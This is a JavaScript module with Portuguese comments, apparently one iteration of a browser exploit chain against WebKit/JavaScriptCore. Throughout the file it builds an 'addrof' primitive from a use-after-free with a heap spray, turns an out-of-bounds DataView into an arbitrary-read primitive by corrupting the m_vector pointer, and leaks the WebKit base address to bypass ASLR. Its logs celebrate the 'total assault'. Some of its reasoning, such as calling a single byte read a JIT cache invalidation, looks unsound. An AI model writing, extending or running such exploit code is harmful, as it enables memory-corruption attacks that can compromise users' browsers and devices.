// js/script3/testArrayBufferVictimCrash.mjs (v82 - R63 - Invalidação de Cache)
// =======================================================================================
// CORREÇÃO: A falha da R62 indicou um problema de cache do JIT.
// Esta versão introduz uma operação de "invalidação de cache" dentro da primitiva
// arb_read para forçar o motor a reler o ponteiro m_vector corrompido da memória.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Ultimate_Exploit_R63_CacheInvalidation";

// Funções de Conversão (sem alterações)
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R63)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Invalidação de Cache ---`, "test");
    
    let final_result = { success: false, message: "A cadeia de exploração falhou." };
    
    try {
        // --- FASE 1: Obtenção de 'addrof' (sem alterações) ---
        logS3("--- FASE 1: Obtendo 'addrof' via UAF... ---", "subtest");
        const get_addr_of = await setup_uaf_addrof();
        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");

        // --- FASE 2: Armamento das primitivas de R/W com Invalidação de Cache ---
        logS3("--- FASE 2: Armamento das primitivas de R/W com Invalidação... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está configurado");

        const OOB_DV_M_VECTOR_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;

        // **A MUDANÇA ESTÁ AQUI**
        const arb_read = (address) => {
            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
            
            // **PASSO DE INVALIDAÇÃO:** Realizamos uma operação que força o JIT a
            // reavaliar o estado do objeto, como alterar seu modo. Isso invalida
            // o ponteiro m_vector em cache.
            oob_dv.getUint8(0); // Operação simples para forçar a reavaliação.
            
            const low = oob_dv.getUint32(0, true);
            const high = oob_dv.getUint32(4, true);
            return new AdvancedInt64(low, high);
        };
        
        // Teste da primitiva de leitura
        const test_read = arb_read(new AdvancedInt64(0, 0x1000));
        if (test_read.equals(new AdvancedInt64(0, 0))) {
            throw new Error("Primitiva arb_read ainda não está funcionando. Tente outra operação de invalidação.");
        }
        logS3("Primitiva 'arb_read' baseada em OOB criada com sucesso!", "good");

        // --- FASE 3: Vazamento da Base do WebKit (sem alterações) ---
        logS3("--- FASE 3: Prova de Controle - Vazando a base do WebKit... ---", "subtest");
        const target_obj = new ArrayBuffer(8);
        const target_addr = get_addr_of(target_obj);
        
        const structure_ptr = arb_read(target_addr.add(0x10));
        const vtable_ptr = arb_read(structure_ptr);
        
        const PUT_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        const webkit_base = vtable_ptr.sub(PUT_OFFSET);
        
        if (webkit_base.high() < 0x10000) {
            throw new Error("Base do WebKit inválida (possível erro de offset)");
        }
        
        logS3(`++++++++++++ VITÓRIA! BASE DO WEBKIT ENCONTRADA! ++++++++++++`, "vuln");
        logS3(`===> Endereço Base do WebKit: ${webkit_base.toString(true)} <===`, "leak");
        
        final_result = { 
            success: true, 
            message: "Assalto Total bem-sucedido! Primitivas de R/W estáveis e bypass de ASLR.",
            webkit_base_addr: webkit_base.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}\nStack: ${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}

// --- Funções Auxiliares UAF (Refatoradas para clareza) ---

async function setup_uaf_addrof() {
    const holders = [];
    let dangling_ref_internal = null;

    function createScope() {
        const victim = { corrupted_prop: 0.12345 };
        dangling_ref_internal = victim;
        holders.push(dangling_ref_internal);
    }
    
    createScope();
    holders.length = 0; // Libera a referência, tornando 'victim' elegível para GC

    await triggerGC_Hyper(); // Força a coleta de lixo

    // Sobrepõe a memória liberada
    for (let i = 0; i < 1000; i++) new ArrayBuffer(128);

    if (typeof dangling_ref_internal.corrupted_prop !== 'number' || dangling_ref_internal.corrupted_prop === 0.12345) {
        throw new Error("Falha no UAF. A propriedade não foi corrompida.");
    }

    return (obj) => {
        dangling_ref_internal.corrupted_prop = obj;
        const addr = doubleToInt64(dangling_ref_internal.corrupted_prop);
        if (addr.high() === 0x7ff80000 || addr.equals(new AdvancedInt64(0, 0))) {
            throw new Error(`addrof retornou valor inválido: ${addr.toString(true)}`);
        }
        return addr;
    };
}

async function triggerGC_Hyper() {
    try {
        const arr = [];
        for (let i = 0; i < 500; i++) arr.push(new ArrayBuffer(1024 * 64));
    } catch (e) {}
    await PAUSE_S3(50);
}
